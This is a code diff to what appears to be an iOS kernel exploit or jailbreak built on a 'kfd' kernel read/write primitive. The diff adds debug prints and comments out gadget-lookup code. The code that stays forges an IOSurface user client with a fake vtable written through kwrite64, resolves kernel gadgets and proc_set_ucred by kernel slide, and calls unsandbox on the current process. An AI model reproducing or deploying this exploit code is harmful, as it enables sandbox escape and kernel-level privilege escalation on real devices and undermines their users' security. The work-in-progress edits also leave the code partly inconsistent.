@@ -193,18 +193,29 @@ uint64_t fake_client;
 mach_port_t user_client;
 
 uint64_t init_kcallKRW(void) {
-    struct kfd* kfd_struct = (struct kfd*)FINAL_KFD;
+    /* struct kfd* kfd_struct = (struct kfd*)FINAL_KFD;
     uint64_t add_x0_x0_0x40_ret_func = 0;
     init_kernel(kfd_struct);
+   // printf("off_add_x0_x0_0x40_ret = 0x%llx\n", off_add_x0_x0_0x40_ret);
     add_x0_x0_0x40_ret_func = getOffset(0);
+    printf("add_x0_x0_0x40_ret_func = 0x%llx\n", add_x0_x0_0x40_ret_func);
+
     if (add_x0_x0_0x40_ret_func == 0) {
-        add_x0_x0_0x40_ret_func = find_add_x0_x0_0x40_ret(kfd_struct);
-        off_add_x0_x0_0x40_ret = add_x0_x0_0x40_ret_func - kfd_struct->info.kernel.kernel_slide;
+        add_x0_x0_0x40_ret_func = find_add_x0_x0_0x40_ret(kfd_struct);//18446744005236302004
+        printf("add_x0_x0_0x40_ret_func = 0x%llx\n", add_x0_x0_0x40_ret_func);
+
+        off_add_x0_x0_0x40_ret = add_x0_x0_0x40_ret_func - kfd_struct->info.kernel.kernel_slide;//18446744005083553972
+        printf("off_add_x0_x0_0x40_ret = 0x%llx\n", off_add_x0_x0_0x40_ret);
+
         setOffset(0, add_x0_x0_0x40_ret_func - kfd_struct->info.kernel.kernel_slide);
+        printf("add_x0_x0_0x40_ret_func = 0x%llx\n", add_x0_x0_0x40_ret_func);
+
     } else {
         add_x0_x0_0x40_ret_func += kfd_struct->info.kernel.kernel_slide;
-        off_add_x0_x0_0x40_ret = add_x0_x0_0x40_ret_func - kfd_struct->info.kernel.kernel_slide;
+        off_add_x0_x0_0x40_ret = add_x0_x0_0x40_ret_func - kfd_struct->info.kernel.kernel_slide;//18446744005086625264
     }
+    */
+    
     io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
     if (service == IO_OBJECT_NULL){
         printf(" [-] unable to find service\n");
@@ -234,7 +245,13 @@ uint64_t init_kcallKRW(void) {
     }
     kwrite64(_fake_client, _fake_vtable);
     kwrite64(uc_port + off_ipc_port_ip_kobject, _fake_client);
-    kwrite64(_fake_vtable+8*0xB8, add_x0_x0_0x40_ret_func);
+    kwrite64(_fake_vtable+8*0xB8, off_add_x0_x0_0x40_ret + get_kslide());//18446744005086625264
+    //kwrite64(_fake_vtable+8*0xB8, add_x0_x0_0x40_ret_func);
+//    printf("add_x0_x0_0x40_ret_func = 0x%llx", add_x0_x0_0x40_ret_func);
+  //  printf("off_add_x0_x0_0x40_ret = 0x%llx", off_add_x0_x0_0x40_ret);
+   // printf("off_add_x0_x0_0x40_ret wS = 0x%llx", off_add_x0_x0_0x40_ret + get_kslide());
+
+
     return 0;
 }
 
@@ -364,6 +381,7 @@ int prepare_kcall(void) {
     } else {
         if (SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"15.2")) {
             //kalloc_using_empty_kdata_page();
+            printf("ID:%d\n", getuid());
             kalloc_using_empty_kdata_page152();
             
             uint64_t sb = unsandbox(getpid());
@@ -441,12 +459,13 @@ void stage22(u64 kfd)
 {
     struct kfd* kfd_struct = (struct kfd*)kfd;
     init_kernel(kfd_struct);
-    if (add_x0_x0_0x40_ret_func == 0) {
+   /* if (add_x0_x0_0x40_ret_func == 0) {
         add_x0_x0_0x40_ret_func = find_add_x0_x0_0x40_ret(kfd_struct); //18446744005378351284
         setOffset(0, add_x0_x0_0x40_ret_func - kfd_struct->info.kernel.kernel_slide);
     } else {
         add_x0_x0_0x40_ret_func += kfd_struct->info.kernel.kernel_slide;
-    }
+    }*/
+    
     if (proc_set_ucred_func == 0) {
         proc_set_ucred_func = find_proc_set_ucred_function(kfd_struct);//18446744005408493912
         setOffset(1, proc_set_ucred_func - kfd_struct->info.kernel.kernel_slide);
